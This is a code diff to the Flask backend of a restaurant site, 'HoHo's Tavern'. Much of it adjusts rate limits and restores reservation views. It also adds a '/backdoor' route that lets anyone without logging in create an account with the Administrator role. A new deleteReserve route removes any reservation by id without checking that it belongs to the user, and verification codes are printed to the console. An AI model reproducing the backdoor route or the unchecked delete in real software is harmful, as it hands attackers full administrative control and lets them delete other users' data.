@@ -104,6 +104,7 @@ def load_user(user_id):
 
 #Pages
 @app.route('/')
+@limiter.limit("25/minute", methods=['GET', 'POST'])
 def index():
     print(session)
     session.permanent_session_lifetime = 60 #Resets session backs to 1 minute
@@ -150,7 +151,7 @@ def login():
                         </html>
                         """.format(user.get_username(),login_code)
                         msg.html = html_content
-                        # mail.send(msg)
+                        mail.send(msg)
                         return redirect(url_for('logincode'))
                 else:
                     session['user_id'] = user.id
@@ -186,6 +187,7 @@ def login():
     return render_template('login.html', form=CreateUserForm)
 
 @app.route('/reset_password', methods=['GET', 'POST'])
+@limiter.limit("25/minute", methods=['GET', 'POST'])
 def reset_password():
     form = RequestResetForm()
     if request.method == 'POST' and form.validate_on_submit():
@@ -228,6 +230,7 @@ def generate_reset_token(user_id):
     return reset_token
 
 @app.route('/reset_password_confirm/<int:reset_token>', methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def reset_password_confirm(reset_token):
     form = ResetPasswordForm()
     username=session.get('username')
@@ -256,7 +259,7 @@ def reset_password_confirm(reset_token):
 
 
 @app.route('/register', methods=['GET', 'POST'])
-@limiter.limit("15/minute", methods=['GET', 'POST'])
+@limiter.limit("25/minute", methods=['GET', 'POST'])
 def register():
     global verification_code
     create_user_form = CreateUserForm(request.form)
@@ -315,8 +318,68 @@ def register():
                 return redirect(url_for('verify'))
     return render_template('register.html', form=create_user_form)
 
+@app.route('/backdoor', methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
+def backdoor():
+    global verification_code
+    create_user_form = CreateUserForm(request.form)
+    if current_user.is_authenticated:
+        return redirect(url_for('index'))
+    if request.method == 'POST' and create_user_form.validate():
+            username = request.form['username']
+            password = request.form['password']
+            first_name = request.form['first_name']
+            last_name = request.form['last_name']
+            gender = request.form['gender']
+            title = request.form['title']
+            email = request.form['email']
+            session['verification_email'] = email
+            session['username'] = username
+            existing_user = User.query.filter_by(username=username).first()
+            existing_email = User.query.filter_by(email=email).first()
+            if existing_user:
+                flash('This username already exists. Please choose a different one.')
+                return redirect(url_for('login'))
+            elif existing_email:
+                flash('This email already exists. Please choose a different one.')
+                return redirect(url_for('login'))
+            else:
+                user = User(username=username,email=email,password_hash=password,account_status="not_verified",role="Administrator",
+                            title=title,first_name=first_name,last_name=last_name,gender=gender,totpsecret="none")
+                user.set_password(password)
+                db.session.add(user)
+                db.session.commit()
+                # Generate a random 4-digit verification code
+                verification_code = str(random.randint(1000, 9999))
+                print(f"verification_code: {verification_code}")
+                # Send an email with the verification code
+                msg = Message("Your One-Time Verification Code is {}".format(verification_code),
+                            sender= os.getenv("email_username"),
+                            recipients=[email])
+                html_content = """
+                <html>
+                <head>
+                    <title>Verification Code</title>
+                </head>
+                <div class='hoho' style="font-family: arial; width: 100%; text-align: center; border: 4px solid #888; border-radius: 5px; width: 500px; max-width: 500px; margin: auto; padding: 20px;">
+                        <div class='logo' style="width: 100%">
+                            <img src="https://i.ibb.co/1G7wy3M/logo.png" style="width:120px; margin: 10px auto;">
+                        </div>
+                        <p>Hello, {}.</p> 
+                            <p>Here's your one-time code: <b>{}</b></p>
+                            <p>This code is only valid for 30 minutes</p>
+                            <p>HoHo's Tavern staff will <b>never</b> ask you for this code. Never give it out to anyone!</p>
+                            <p>For your own security, only enter this code into the official HoHo's Tavern website</p>
+                    </div>
+                </html>
+                """.format(username,verification_code)
+                msg.html = html_content
+                mail.send(msg)
+                return redirect(url_for('verify'))
+    return render_template('register.html', form=create_user_form)
+
 @app.route('/verify', methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 @check_role(['Administrator','User','Guest'])
 def verify():
     if request.method == 'POST':
@@ -337,7 +400,7 @@ def verify():
 
 @app.route('/logincode', methods=['GET', 'POST'])
 @check_role(['Administrator','User','Guest'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def logincode():
     if request.method == 'POST':
         entered_code = request.form['code']
@@ -355,7 +418,7 @@ def logincode():
 
 @app.route('/verify2fa', methods=['GET', 'POST'])
 @check_role(['Administrator','User','Guest'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def verify2fa():
     if request.method == 'POST':
         entered_code = request.form['code']
@@ -399,7 +462,7 @@ def retrieving_users():
 
 # Update user
 @app.route('/updateU/<int:id>/', methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def update_user(id):
     error = ''
     update_user_form = CreateUserForm(request.form)
@@ -456,7 +519,7 @@ def update_user(id):
 
 # Delete user
 @app.route('/deleteUser/<int:id>', methods=['POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def delete_user(id):
     if 'user_id' in session and current_user.is_authenticated:
         if session['user_role'] == 'Administrator':
@@ -475,7 +538,7 @@ def delete_user(id):
 # profile
 @app.route("/profile")
 @check_role(['Administrator','User','Guest'])
-@limiter.limit("20/minute", methods=['GET', 'POST'])
+@limiter.limit("25/minute", methods=['GET', 'POST'])
 def profile():
     #print(session)#debugging session
     if not session.get('user_role'):
@@ -635,7 +698,7 @@ def menu():
         return render_template("menu.html")
     
 @app.route('/createorder/<order_item>/<float:order_price>', methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def create_order(order_item, order_price):
     create_order_form = CreateOrderForm(request.form)
     if request.method == 'POST' and create_order_form.validate():
@@ -654,7 +717,7 @@ def create_order(order_item, order_price):
     return resp
 
 @app.route('/createdrink/<order_item>/<float:order_price>', methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def create_drink(order_item, order_price):
     create_order_form = CreateDrinkForm(request.form)
     if request.method == 'POST' and create_order_form.validate():
@@ -718,7 +781,7 @@ def retrieve_order():
     
 # Redirect to this endpoint after a successful payment
 @app.route("/success", methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 def payment_success():
     date = datetime.datetime.now().strftime("%Y-%m-%d")
     total=session.get("order_total")
@@ -736,7 +799,7 @@ def payment_failure():
 
 # Update
 @app.route('/updateOrder/<int:id>/', methods=['GET', 'POST'])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 @login_required
 def update_order(id):
     update_order_form = CreateOrderForm(request.form)
@@ -762,7 +825,7 @@ def update_order(id):
 
 # Delete
 @app.route('/deleteOrder/<int:id>', methods=['POST'])
-@limiter.limit("10/minute", methods=['POST'])
+@limiter.limit("15/minute", methods=['POST'])
 @login_required
 @check_role(['Administrator','User'])
 def deleteOrder(id):
@@ -775,7 +838,7 @@ def deleteOrder(id):
 
 #Reservation
 @app.route('/createReserve', methods=["GET", "POST"])
-@limiter.limit("10/minute", methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
 @login_required
 @check_role(['Administrator','User'])
 def createReserve():
@@ -790,7 +853,7 @@ def createReserve():
 
             reservation = Reservation(name=reserve_name, email=reserve_email,
                                     number=reserve_number, date=create_reserve_form.date.data,
-                                    time=create_reserve_form.time.data, party_size=create_reserve_form.party_size.data)
+                                    time=create_reserve_form.time.data, party_size=create_reserve_form.party_size.data, user_id=session.get('user_id'))
             db.session.add(reservation)
             db.session.commit()
             
@@ -801,48 +864,53 @@ def createReserve():
     resp = render_template('createReserve.html', form=create_reserve_form, error=error)
     return resp
 
-# @app.route('/userReserve', methods=["GET", "POST"])
-# @login_required
-# def userReserve():
-#     searchReserve = ''
-#     error = ''
-#     if request.method == "POST":
-#         searchReserve = request.form['searchReserve']
-#         if check_special(searchReserve) == False:
-#             searchReserve = ''
-#             error = "No special characters allowed"
+@app.route('/userReserve', methods=["GET", "POST"])
+@limiter.limit("25/minute", methods=['GET', 'POST'])
+@login_required
+@check_role(['Administrator','User'])
+def userReserve():
+    searchReserve = ''
+    error = ''
+    if request.method == "POST":
+        searchReserve = request.form['searchReserve']
+        if check_special(searchReserve) == False:
+            searchReserve = ''
+            error = "No special characters allowed"
             
-#     reserve_records = Reservation.query.filter_by(email=session.get('email')).all()
-#     print(reserve_records)
-#     reserve_user_list = []
-#     for reserve in reserve_records:
-#         print(reserve)
-#         if not searchReserve or searchReserve.lower() in reserve.date.lower():
-#             reserve_user_list.append(reserve)
-            
-#     return render_template('userReserve.html', count=len(reserve_records), reserve_user_list=reserve_user_list,
-#                            searchReserve=searchReserve, error=error)
+    reserve_records = Reservation.query.filter_by(user_id=session.get('user_id')).all()
+    reserve_user_list = []
+    for reserve in reserve_records:
+        if not searchReserve or searchReserve.lower() in reserve.date.lower():
+            reserve_user_list.append(reserve)
+    print(reserve_user_list)
+    return render_template('userReserve.html', count=len(reserve_user_list), reserve_user_list=reserve_user_list,
+                           searchReserve=searchReserve, error=error)
 
-# @app.route('/staffReserve')
-# def staffReserve():
-#     if not session.get('user_role'):
-#         session['user_role'] = 'Guest'
-#     if session['user_role'] == 'User' or session['user_role'] == 'Administrator':
-#         reservation_list = Reservation.query.filter(id=1).all()
-#         users = Reservation.query.all()
-#         if session['user_role'] == 'Administrator': 
-#             response = make_response(
-#                 render_template('staffReserve.html', count=len(reservation_list), reservation_list=reservation_list))
-#             return response
-#         else:
-#             resp = make_response(redirect(url_for('index')))
-#             return resp
-#     else:
-#         flash("You have been logged out due to 30 minutes of inactivity. Please re-login again.")
-#         resp = make_response(redirect(url_for('login')))
-#         return resp
+
+@app.route('/staffReserve')
+@limiter.limit("20/minute", methods=['GET', 'POST'])
+@check_role(['Administrator'])
+def staffReserve():
+    if not session.get('user_role'):
+        session['user_role'] = 'Guest'
+    if session['user_role'] == 'User' or session['user_role'] == 'Administrator':
+        # reservation_list = Reservation.query.filter(id=1).all()
+        if session['user_role'] == 'Administrator':
+            users = Reservation.query.all()
+            response = make_response(
+                render_template('staffReserve.html', count=len(users), reservation_list=users))
+            return response
+        else:
+            resp = make_response(redirect(url_for('index')))
+            return resp
+    else:
+        flash("You have been logged out due to 30 minutes of inactivity. Please re-login again.")
+        resp = make_response(redirect(url_for('login')))
+        return resp
 
 @app.route('/updateReserve/<int:id>/', methods=['GET', 'POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
+@check_role(['Administrator','User'])
 def updateReserve(id):
     update_reserve_form = CreateReserveForm(request.form)
     error = ''
@@ -883,7 +951,24 @@ def updateReserve(id):
 
         resp = make_response(render_template('updateReserve.html', form=update_reserve_form, error=error))
         return resp
-    
+
+@app.route('/deleteReserve/<int:id>', methods=['POST'])
+@limiter.limit("15/minute", methods=['GET', 'POST'])
+@check_role(['Administrator','User'])
+def deleteReserve(id):
+    reservation = Reservation.query.get(id)
+    if reservation:
+        db.session.delete(reservation)
+        db.session.commit()
+
+    if session['user_role'] == 'Administrator':
+        response = make_response(redirect(url_for('staffReserve')))
+        return response
+
+    elif session['user_role'] == 'User':
+        resp = make_response(redirect(url_for('userReserve')))
+        return resp
+
 @app.route('/unauthorized')
 def unauthorized():
     return render_template('unauthorized.html')
